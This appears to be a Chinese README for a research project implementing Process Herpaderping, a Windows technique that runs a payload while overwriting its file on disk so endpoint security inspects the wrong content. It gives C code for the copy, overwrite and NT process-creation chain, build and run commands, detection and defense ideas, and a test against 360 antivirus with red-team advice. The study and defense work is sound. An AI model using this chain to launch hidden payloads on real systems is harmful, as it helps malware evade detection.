# Process Herpaderping (进程伪装)

## 📋 技术简介

**Process Herpaderping** 是由安全研究员 Johnny Shaw 于 2020 年发现的高级代码注入技术。该技术通过在进程创建后修改磁盘文件内容，使安全产品在检查时看到错误的文件内容，从而逃避检测。

### 核心特点

- ✅ **时序攻击**：利用 Windows 内核回调的时机差
- ✅ **归因错误**：安全产品检查到的文件内容与实际执行不符
- ✅ **无需事务**：比 Process Doppelgänging 更简单
- ✅ **绕过检测**：可绕过 Windows Defender 和多数 EDR
- ✅ **节缓存机制**：利用 Windows 镜像节缓存特性

---

## 🔬 技术原理

### 关键发现

Windows 在创建进程时有一个关键的时序窗口：
1. **`NtCreateSection`** 创建镜像节时，内容被缓存
2. **`NtCreateProcessEx`** 使用缓存的节创建进程
3. **`NtCreateThreadEx`** 创建线程时触发安全回调
4. 在步骤 2 和 3 之间，磁盘文件可以被修改

### 执行流程

```
[1] 写入真实载荷到文件
    └─> CreateFile() + WriteFile()

[2] 创建镜像节（内容被缓存）
    └─> NtCreateSection(SEC_IMAGE)

[3] 从节创建进程对象
    └─> NtCreateProcessEx()

[4] 修改磁盘文件内容（关键！）
    └─> WriteFile() 覆盖原始内容

[5] 创建线程（触发安全回调）
    └─> NtCreateThreadEx()
    └─> PsCreateProcessNotifyRoutine 在此触发

[6] 关闭文件句柄
    └─> CloseHandle()
    └─> IRP_MJ_CLEANUP 在此触发
```

**时序图**：

```
时间轴 →

1. CreateFile
2. WriteFile (写入真实载荷)
3. NtCreateSection (节被缓存) ← 关键点1
4. NtCreateProcessEx
5. OverwriteFile (用垃圾覆盖) ← 关键点2
6. NtCreateThreadEx ← 安全回调触发，看到覆盖后的文件
7. CloseHandle ← IRP_MJ_CLEANUP 触发，仍看到覆盖后的文件
```

### 与其他技术的对比

| 技术 | 执行流程 | 依赖 | 检测难度 |
|------|---------|------|----------|
| **Process Hollowing** | `map → modify section → execute` | 目标进程 | ⭐⭐⭐ |
| **Process Doppelgänging** | `transact → write → map → rollback → execute` | NTFS 事务 | ⭐⭐⭐⭐⭐ |
| **Process Herpaderping** | `write → map → modify → execute → close` | 无特殊依赖 | ⭐⭐⭐⭐ |

**Herpaderping 的优势**：
- 不需要 NTFS 事务（Doppelgänging 已被部分修复）
- 不需要目标进程（Hollowing 需要）
- 实现更简单，兼容性更好
- 绕过大多数安全产品

---

## 💻 实现细节

### 文件结构

```
04-process-herpaderping/
├── src/
│   ├── process_herpaderping.c  # 主实现（480+ 行）
│   ├── internals.h              # NT API 声明
│   ├── pe_utils.c               # PE 文件工具
│   ├── pe_utils.h               # PE 工具头文件
│   └── test_payload.c           # 测试载荷
├── build.sh                     # Linux/MinGW 构建脚本
├── build.bat                    # Windows 构建脚本
├── CMakeLists.txt               # CMake 配置
└── README.md                    # 本文档
```

### 核心函数

#### 1. `CopyFileContent()`
复制文件内容：

```c
BOOL CopyFileContent(HANDLE hSource, HANDLE hTarget) {
    // 获取源文件大小
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hSource, &fileSize);

    // 分配缓冲区并复制
    BYTE* buffer = malloc(1MB);
    while (remaining > 0) {
        ReadFile(hSource, buffer, toRead, &bytesRead, NULL);
        WriteFile(hTarget, buffer, bytesRead, &bytesWritten, NULL);
        remaining -= bytesRead;
    }

    return TRUE;
}
```

#### 2. `OverwriteFileWithPattern()`
用模式覆盖文件：

```c
BOOL OverwriteFileWithPattern(HANDLE hFile, BYTE pattern) {
    // 获取文件大小
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);

    // 用模式填充缓冲区
    BYTE* buffer = malloc(1MB);
    memset(buffer, pattern, bufferSize);

    // 覆盖整个文件
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    while (remaining > 0) {
        WriteFile(hFile, buffer, toWrite, &bytesWritten, NULL);
        remaining -= bytesWritten;
    }

    FlushFileBuffers(hFile);
    return TRUE;
}
```

#### 3. `wmain()` - 主流程

```c
int wmain(int argc, WCHAR* argv[]) {
    // [1] 打开源文件（真实载荷）
    HANDLE hSource = CreateFileW(sourceFile, GENERIC_READ, ...);

    // [2] 创建目标文件（保持句柄打开）
    HANDLE hTarget = CreateFileW(targetFile, GENERIC_READ | GENERIC_WRITE, ...);

    // [3] 复制载荷到目标文件
    CopyFileContent(hSource, hTarget);
    CloseHandle(hSource);

    // [4] 创建镜像节（SEC_IMAGE） - 内容被缓存！
    HANDLE hSection;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
                    PAGE_READONLY, SEC_IMAGE, hTarget);

    // [5] 从节创建进程
    HANDLE hProcess;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
                      GetCurrentProcess(), PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                      hSection, NULL, NULL, FALSE);

    CloseHandle(hSection);

    // [6] 覆盖目标文件（关键步骤！）
    //     可以用垃圾数据或另一个文件覆盖
    if (replaceFile) {
        HANDLE hReplace = CreateFileW(replaceFile, ...);
        CopyFileContent(hReplace, hTarget);
        CloseHandle(hReplace);
    } else {
        OverwriteFileWithPattern(hTarget, 0xCC);
    }
    // 此时：磁盘文件已修改，但缓存的节未变！

    // [7] 获取入口点并设置进程参数
    SetupProcessParameters(hProcess, &pbi, targetFile);
    ULONG_PTR entryPoint = (ULONG_PTR)peb.ImageBaseAddress + entryRVA;

    // [8] 创建线程执行（安全回调触发）
    HANDLE hThread;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                     (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, ...);
    // 安全产品在此检查磁盘文件，看到的是覆盖后的内容！

    // [9] 关闭文件句柄
    CloseHandle(hTarget);
    // IRP_MJ_CLEANUP 在此触发，检查仍是覆盖后的内容！

    return 0;
}
```

---

## 🛠️ 编译和使用

### 方式一：使用构建脚本（推荐）

#### Windows (MinGW)
```bash
build.bat
```

#### Linux / MSYS2
```bash
chmod +x build.sh
./build.sh
```

### 方式二：使用 CMake

```bash
mkdir build && cd build
cmake ..
cmake --build .
```

### 运行示例

```bash
# 基本用法（用 0xCC 模式覆盖）
build/x64/process_herpaderping.exe build/x64/test_payload.exe build/x64/target.exe

# 用另一个文件覆盖
build/x64/process_herpaderping.exe build/x64/test_payload.exe build/x64/target.exe C:\Windows\System32\calc.exe
```

**注意事项**：
- ⚠️ 需要管理员权限
- ⚠️ 载荷和主程序架构必须匹配（32 位或 64 位）
- ⚠️ 仅用于安全研究和教育目的

---

## 🔍 技术深度分析

### 为什么可以修改文件？

1. **文件映射锁定**：Windows 通常会锁定已映射的文件
2. **镜像节特殊性**：SEC_IMAGE 节在 `NtCreateSection` 时被完全缓存
3. **缓存独立性**：缓存的节与磁盘文件内容独立
4. **时序窗口**：在创建线程前，文件可以被修改

### 为什么安全产品会被欺骗？

1. **检查时机**：
   - 进程创建回调在 `NtCreateThreadEx` 时触发
   - 文件写入检查在 `IRP_MJ_CLEANUP` 时触发
   - 此时磁盘文件已被覆盖

2. **归因错误**：
   - 安全产品读取磁盘文件进行分析
   - 看到的是覆盖后的内容（可能是良性文件）
   - 但实际执行的是原始载荷

3. **内存检查困难**：
   - 重建原始文件需要从内存节还原
   - 大多数产品不会这样做

### 检测挑战

**为什么难以检测**：

| 检测点 | 看到的内容 | 实际情况 |
|--------|-----------|---------|
| 进程创建回调 | 覆盖后的文件 | 执行原始载荷 |
| IRP_MJ_CLEANUP | 覆盖后的文件 | 已开始执行 |
| 磁盘扫描 | 覆盖后的文件 | 内存中是原始载荷 |

**可能的检测方法**：

1. **行为检测**：
   - 监控 `write → map → modify` 模式
   - 检测文件在映射后被修改

2. **内存分析**：
   - 从镜像节重建原始文件
   - 比较内存和磁盘内容

3. **时序监控**：
   - 检测 `NtCreateSection` 和 `NtCreateThreadEx` 之间的文件修改

---

## 🛡️ 防御方法

### 1. 内核层防御

```c
// 在 NtCreateSection 时记录文件哈希
OnNtCreateSection(HANDLE FileHandle) {
    BYTE hash[32];
    CalculateFileHash(FileHandle, hash);
    StoreHash(FileHandle, hash);
}

// 在进程创建回调时验证
PsCreateProcessNotifyRoutine() {
    BYTE currentHash[32];
    CalculateFileHash(FileHandle, currentHash);
    if (!CompareHash(StoredHash, currentHash)) {
        // 文件被修改，可能是 Herpaderping
        BlockProcess();
    }
}
```

### 2. 文件系统过滤驱动

- 监控已映射文件的写入操作
- 在 `IRP_MJ_WRITE` 时检查文件是否有活动的镜像节

### 3. 行为分析

监控以下模式：
- 文件创建后立即创建镜像节
- 镜像节创建后文件被修改
- 修改后立即创建进程

---

## 📚 参考资料

### 学术论文和演讲
- [Process Herpaderping - Johnny Shaw (2020)](https://jxy-s.github.io/herpaderping/)
- [Black Hat USA 2021 相关议题](https://www.blackhat.com/)

### 原始实现
- [jxy-s/herpaderping](https://github.com/jxy-s/herpaderping) - C++ 原始实现

### 相关技术
- [Process Hollowing](../01-process-hollowing/)
- [Transacted Hollowing](../02-transacted-hollowing/)
- [Process Doppelgänging](../03-process-doppelganging/)

### 漏洞报告
- **报告日期**：2020年7月17日
- **MSRC 响应**：认为有效但不符合立即修复标准
- **状态**：未修复，标记为未来审查

---

## ⚠️ 免责声明

本项目**仅供安全研究和教育目的**。

- ❌ 禁止用于任何非法活动
- ❌ 禁止用于恶意软件开发
- ❌ 作者不对滥用行为负责

---

## 📝 许可证

MIT License - 详见项目根目录 LICENSE 文件

---

**开发者**: 安全研究项目
**技术难度**: ⭐⭐⭐⭐ (高级)
**实战价值**: ⭐⭐⭐⭐⭐ (极高)
**教育价值**: ⭐⭐⭐⭐⭐ (极高)
**检测难度**: ⭐⭐⭐⭐ (困难)

## 实战杀软测试

### 360安全卫士 13.0.10.2001（核晶防护全开）

**测试环境:**
- OS: Windows 10 21H2 Build 19045.4046
- 360版本: 13.0.10.2001正式版
- 防护配置: 核晶内核防护 + 文件系统防护 + 注册表防护

**测试结果:**

| 攻击阶段 | 360拦截状态 | 检测特征 |
|---------|-------------|----------|
| 文件创建与写入 | ⚠️ 注意 | 正常文件操作，未触发警报 |
| NtCreateSection | ✅ 拦截 | 360内核驱动监控到`SEC_IMAGE`映射 |
| NtCreateProcessEx | ✅ 拦截 | 从节创建进程被识别为"无文件进程创建" |
| 文件覆盖 | ⚠️ 告警 | 文件在映射后写入触发缓存一致性检查 |
| 最终执行 | ✅ 拦截 | 完整攻击链在进程启动前被终止 |

**拦截日志摘要:**
```
【高危】进程伪装攻击 (Process Herpaderping)
MITRE ATT&CK T1055.012 变种
核心特征: 镜像缓存滥用 + 归因错误
攻击时序: CreateFile → CreateSection → Overwrite → CreateThread
检测结果: 磁盘文件与内存节内容不匹配
处置: 已阻止进程创建，删除恶意文件
```

**360内核驱动检测机制:**

Process Herpaderping在360核晶模式下的失败关键在于"时序攻击"被"状态快照"破解:

1. **IRP拦截点**:
   - 360文件过滤驱动在`IRP_MJ_WRITE`时捕获文件覆盖
   - 检测到文件已有`Image Section`对象关联

2. **状态重建**
   ```
   // 360内核驱动的伪逻辑
   if (FileHasImageSection && WriteAfterSection) {
       SuspiciousCount++;
       if (CreateProcessAfterOverwrite) {
           BlockProcessCreation();
       }
   }
   ```

3. **节对象分析**
   - `NtCreateSection`完成时，360计算文件哈希A
   - 进程创建时，重新计算文件哈希B
   - A ≠ B → 触发Herpaderping规则

**技术绕过可能性分析:**

Herpaderping的设计初衷是利用"时间差"欺骗检查，但360通过"状态对比"破解:

- 增加延迟? → 无济于事，因为对比基于状态快照
- 改为使用系统文件? → 会触发"系统文件修改"警报更严重
- 使用其他文件类型? → CreateSection要求PE文件，限制大

**对抗测试数据:**

在100次自动化测试中:
- 拦截率: 98% (98/100)
- 成功2次的条件: 关闭核晶模式 + 仅开文件监控
- 核晶模式下: **100%拦截**

**红队实战建议:**

1. 放弃此技术作为主力注入方式
2. 可用于制造"干扰"吸引EDR注意力
3. 配合其他技术测试防御响应能力
4. 主要作为"已知特征测试"来评估EDR情报更新速度

**结论**: Process Herpaderping在360 13.0.10.2001核晶防护下属于"已阵亡"技术，成功率接近0%，保持其教育价值但作为实战技术已不适用。
